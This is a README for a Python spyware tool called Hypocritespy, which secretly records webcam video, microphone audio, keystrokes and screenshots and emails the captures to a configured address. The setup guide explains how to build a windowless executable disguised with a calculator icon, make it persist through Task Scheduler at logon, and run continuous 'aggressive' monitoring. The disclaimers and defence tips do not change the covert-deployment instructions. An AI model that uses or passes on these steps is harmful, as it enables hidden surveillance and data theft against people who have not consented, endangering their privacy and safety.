Hypocritespy

A Python-based surveillance utility
Built with passion, coffee, and controlled chaos by Ronny Rogers (Mugabo Rongin)

⚠️ Important Notice

This tool is intended strictly for LEGITIMATE SECURITY TESTING on devices you own or have explicit authorization to monitor.
Unauthorized use is illegal and violates privacy laws worldwide.

🎯 Overview

Hypocritespy captures system activity through multiple monitoring vectors:

🎥 Webcam Recording — Captures video from the default camera

🎤 Microphone Recording — Records ambient audio

⌨️ Keylogging — Tracks keyboard inputs

🖼️ Screenshots — Takes periodic screenshots

Default operation:
Records 10 minutes every 3 hours, emails captured data, then repeats.

🛠️ Quick Setup Guide
1. Configuration

Open the Python source files and update the following values:

YOUR_EMAIL = "your_email@gmail.com"           # Your sending email address
APP_PASSWORD = "your_app_specific_password"   # Use an app password, NOT your regular email password
RECIPIENT = "receiver@gmail.com"               # Destination email for captured data

# Timing settings (customize as needed)
RECORD_DURATION = 600     # Duration in seconds (default: 10 minutes)
INTERVAL = 10800          # Interval between recording sessions in seconds (default: 3 hours)

2. Build the Executable

To create a discreet executable, use a benign icon (e.g., calculator.ico):

pyinstaller --onefile --windowed --icon=calculator.ico main.py

3. Ensure Startup Execution

For persistent operation, configure Task Scheduler (Windows) or an equivalent method to run the program at startup or user logon.

🎨 Customization

Timing presets:

# Quick monitoring (1 minute every hour)
RECORD_DURATION = 60
INTERVAL = 3600

# Aggressive monitoring (continuous)
RECORD_DURATION = 86400  # 24 hours
INTERVAL = 1             # Immediate repeat


Feature toggles: Enable or disable modules (webcam, mic, keylogger, screenshots) in the configuration files as needed.

⚠️ Critical Warnings

Antivirus software will likely flag this tool as malicious. This is expected behavior.

Always use app-specific passwords for email, never your primary account password.

Test exclusively in isolated virtual machines or controlled environments.

Review and comply with all local laws before use.

Obtain written consent from all monitored parties.

🛡️ Defense Against Surveillance Tools

To protect your systems from unauthorized monitoring:

Use reputable antivirus and anti-malware solutions.

Regularly audit startup programs and scheduled tasks.

Monitor outgoing network connections for suspicious activity.

Employ physical webcam covers when not in use.

📚 Legitimate Use Cases

Parental control (with required knowledge or consent)

Employee monitoring (with legal compliance and consent)

Personal device security research

Authorized penetration testing

Educational cybersecurity exercises

🚫 Prohibited Uses

Monitoring without explicit consent

Spying on partners, friends, or family

Corporate espionage

Any unauthorized surveillance or privacy invasion

⚖️ Legal Disclaimer

By using this software, you agree that:

You will use it only in a legal, ethical manner.

You accept full responsibility for any consequences arising from its use.

The developer holds no liability for misuse or illegal activities.

You understand the potential legal ramifications of unauthorized surveillance.

👤 Author

Ronny Rogers
Developer | Cybersecurity Specialist | Penetration Tester
More info

🔐 Final Note

The true power of cybersecurity lies in protection, not intrusion. Use this knowledge responsibly to strengthen defenses and respect privacy.

Version: 1.0 | For Educational Purposes Only | Use Responsibly
